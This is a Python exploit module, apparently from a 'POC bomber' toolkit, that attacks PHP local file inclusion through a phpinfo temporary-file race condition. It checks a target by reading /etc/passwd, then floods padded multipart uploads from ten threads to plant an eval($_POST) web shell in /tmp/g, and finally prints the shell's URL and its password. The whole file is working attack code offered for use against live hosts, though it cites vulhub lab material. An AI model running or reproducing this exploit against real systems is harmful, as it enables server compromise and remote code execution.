import requests, re
import urllib
from urllib.parse import urlparse
import socket, threading, sys


def verify(url):
    relsult = {
        'name': 'PHP文件包含漏洞(利用phpinfo)',
        'vulnerable': False,
        'attack': True,
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
    }
    try:
        vurl1 = urllib.parse.urljoin(url, 'phpinfo.php')
        vurl2 = urllib.parse.urljoin(url, 'lfi.php?file=/etc/passwd')
        rep1 = requests.get(vurl1, headers=headers, timeout=3)
        rep2 = requests.get(vurl2, headers=headers, timeout=3)
        if re.search('PHP Version', rep1.text) and re.search('root:x', rep2.text):
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['method'] = 'GET'
            relsult['payload'] = vurl2
            relsult['about'] = 'https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md, https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py'
            relsult['attack'] = True
        return relsult
    except:
        return relsult


import sys
import threading
import socket


def setup(host, port):
    TAG = "POC bomber"
    PAYLOAD = """%s\r
<?php file_put_contents('/tmp/g', '<?php eval($_POST["pocbomber"]); echo "Hack by tr0uble_mAker  :  )"?>')?>\r""" % TAG
    REQ1_DATA = """-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding = "A" * 5000
    REQ1 = """POST /phpinfo.php?a=""" + padding + """ HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=""" + padding + """\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """ + padding + """\r
HTTP_ACCEPT_LANGUAGE: """ + padding + """\r
HTTP_PRAGMA: """ + padding + """\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" % (len(REQ1_DATA), host, REQ1_DATA)
    # modify this to suit the LFI script
    LFIREQ = """GET /lfi.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (bytes(REQ1, encoding='utf-8'), bytes(TAG, encoding='utf-8'), bytes(LFIREQ, encoding='utf-8'))


def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += str(s.recv(offset))
    try:
        i = d.index("[tmp_name] =&gt; ")
        fn = d[i + 17:i + 31]
    except ValueError:
        return None

    s2.send(lfireq % (bytes(fn, encoding='utf-8'), bytes(host, encoding='utf-8')))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn


counter = 0


class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print("\n[+] 成功写入文件: /tmp/g ")
                    self.event.set()

            except socket.error:
                return


def getOffset(host, port, phpinforeq):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(phpinforeq)

    d = ""
    while True:
        i = s.recv(4096)

        d += str(i)
        if i == b"":
            break
        # detect the final chunk
        if i.endswith(b"0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt; ")
    if i == -1:
        raise ValueError("[-] No php tmp_name in phpinfo output")

    print("[+] found %s at %i" % (d[i:i + 10], i))
    # padded up a bit
    return int(i) + 256


def attack(url):
    if verify(url):
        try:
            print("[+] 开始尝试通过条件竞争写入文件...")
            print("-=" * 30)

            oH = urlparse(url)
            a = oH.netloc.split(':')
            port = 80
            if 2 == len(a):
                port = a[1]
            elif 'https' in oH.scheme:
                port = 443
            host = a[0]
            port = int(port)
            poolsz = 10

            reqphp, tag, reqlfi = setup(host, port)
            offset = getOffset(host, port, reqphp)
            sys.stdout.flush()

            maxattempts = 10000
            e = threading.Event()
            l = threading.Lock()

            print("[+] 正在开启 %d 线程..." % poolsz)
            sys.stdout.flush()

            tp = []
            for i in range(0, poolsz):
                tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))

            for t in tp:
                t.start()
            try:
                while not e.wait(1):
                    if e.is_set():
                        break
                    with l:
                        sys.stdout.write("\r% 4d / % 4d" % (counter, maxattempts))
                        sys.stdout.flush()
                        if counter >= maxattempts:
                            break
                if e.is_set():
                    print("[+] Conggratulations! We got a webshell!")
                    print('[+] webshell地址(蚁剑): {0}'.format(urllib.parse.urljoin(url, 'lfi.php?file=/tmp/g')))
                    print('[*] 密码: pocbomber')
                else:
                    print("\n[-] Fail")
            except KeyboardInterrupt:
                print("\n[-] 正在关闭线程......")
                e.set()

            print("[+] ending...")
            for t in tp:
                t.join()
            return True
        except:
            return False
    else:
        return False

